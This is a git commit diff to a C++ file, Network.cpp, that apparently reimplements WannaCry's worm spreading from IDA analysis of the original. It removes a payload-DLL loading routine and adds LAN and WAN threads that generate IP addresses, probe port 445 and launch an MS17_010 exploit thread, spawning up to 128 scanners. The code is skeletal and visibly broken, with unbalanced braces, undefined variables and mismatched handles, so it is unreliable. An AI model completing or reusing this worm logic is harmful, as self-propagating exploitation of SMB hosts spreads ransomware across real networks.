93bfd44c5495efbd92acf157a0d3464f532ed134
bhassani <bhassani@users.noreply.github.com>
2024-01-10 15:33:37 +0100

    Update Network.cpp

--- Network.cpp
+++ Network.cpp
@@ -2,53 +2,6 @@
 //skeleton code at this moment
 //still a work in progress
 
-//EXE file global here
-volatile HGLOBAL hDLL_x86;
-volatile HGLOBAL hDLL_x64;
-
-//init the DLL payload here
-//read from Wannacry in IDA
-//also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
-//Memory alloc functions: https://www.tenouk.com/visualcplusmfc/visualcplusmfc20.html
-HGLOBAL initialize_payload()
-{
-	/*
-	32-bit dll start address 0x40B020, size is 0x4060 bytes
-	64-bit dll start address 0x40F080, size is 0xc8a4 bytes
-	*/
-	DWORD NumberOfBytesRead;
-	DWORD fileSize;
-	//size = 0x4060 converted to decimal: 16480
-	//Possibly -> GlobalAlloc(GPTR, 5298176)
-	hDLL_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176); 
-	/* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */
-	
-	//size = 0xc8a4 converted to decimal: 51364
-	//Possibly -> GlobalAlloc(GPTR, 5298176)
-	hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
-	
-	//if no errors continue
-	if(hDLL_x86 || hDLL_x64)
-	{
-		//GENERIC_READ is 0x80000000 and GENERIC_WRITE is 0x40000000
-		HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
-		if(fileHandle != INVALID_HANDLE_VALUE)
-		{
-			fileSize = GetFileSize(fileHandle, NULL);
-			*(DWORD*)hDLL_x86 + 0x4060 = fileSize; //Dword length written in x86 DLL buffer
-			*(DWORD*)hDLL_x64 + 0xc8a4 = fileSize; //Dword length written in x64 DLL buffer
-			ReadFile(fileHandle, hDLL_x86 + 0x4060 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
-			ReadFile(fileHandle, hDLL_x64 + 0xc8a4 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
-    			CloseHandle(fileHandle);
-		}
-	}
-	else
-	{
-		GlobalFree(hMemory_x86);
-		GlobalFree(hMemory_x64);
-	}
-}
-
 //https://stackoverflow.com/questions/37838490/how-to-properly-set-a-flag-in-the-write-fds-and-select-in-c
 int canConnectToPort445(char *ip)
 {
@@ -111,12 +64,13 @@ DWORD MS17_010(DWORD LPPARAM)
 	return 0;
 }
 			      
-int scanIP(DWORD LPPARAM)
+int scanIP(void *arg)
 {
+	char *target = (char*)arg;
 	HANDLE ExploitHandle;
 	if (canConnectToPort445(target) > 0)
 	{
-		ExploitHandle = (HANDLE)_beginthreadex(NULL, MS17_010, (DWORD)LPPARAM, 0, 0);
+		ExploitHandle = (HANDLE)_beginthreadex(NULL, MS17_010, target, 0, 0);
 		//Not sure if the if statement is needed but we'll keep it here for now
 		if( ExploitHandle )
 		{
@@ -131,6 +85,45 @@ int scanIP(DWORD LPPARAM)
   	return 0;
 }
 
+int __stdcall LANThreadFunc(void *param)
+{
+	//Obtain local IP address
+
+
+	//Generate other IP addresses
+	char local_generated_ip;
+	
+	HANDLE ScanIPHandle;
+	ScanIPHandle = (HANDLE)_beginthreadex(0, 0, scanIP, local_generated_ip, 0, 0);
+
+	if( ScanIPHandle )
+	{
+		if (WaitForSingleObject(ScanIPHandle, 60000) == 258 ))
+		{
+			TerminateThread(ScanIPHandle, 0);
+      			CloseHandle(ScanIPHandle);
+	}
+}
+
+int __stdcall WANThreadFunc(void *param)
+{
+	//Generate IP address
+
+	char generated_ip;
+	
+	HANDLE ScanIPHandle;
+	ScanIPHandle = (HANDLE)_beginthreadex(0, 0, scanIP, generated_ip, 0, 0);
+
+	if( ScanIPHandle )
+	{
+		if (WaitForSingleObject(ExploitHandle, 60000) == 258 ))
+		{
+			TerminateThread(ExploitHandle, 0);
+      			CloseHandle(ExploitHandle);
+			
+	}
+}
+
 /*
 Threading: https://www.bogotobogo.com/cplusplus/multithreaded2A.php
 http://simplesamples.info/windows/_beginthreadex.aspx
@@ -138,11 +131,19 @@ https://jeffpar.github.io/kbarchive/kb/132/Q132078/
 https://www.programmersought.com/article/57053139965/
 https://sodocumentation.net/winapi/topic/1756/process-and-thread-management
 */
-int threadMain()
+int threadScanMain()
 {
-	//GetTargets(Char1, Char2);
+	HANDLE LanThread;
+	LanThread = (HANDLE)_beginthreadex(NULL, NULL, LANThreadFunc, 0, 0, 0);
 	
-	HANDLE ScanIPMain;
-	//create 100 threads
-	ScanIPMain = (HANDLE)_beginthreadex(0, 0, scanIP, v1[i], 0, 0);
+	int thread_count = 0;
+	DWORD dwThreadIdArray[128];
+  	HANDLE hThreadArray[128];
+	do
+	{
+    		hThreadArray[i] = CreateThread(NULL, 0, WANThreadFunc, NULL, 0, &dwThreadIdArray[i]);
+		thread_count++;
+		Sleep(2000);
+  	}
+	}while(thread_count <= 128);
 }
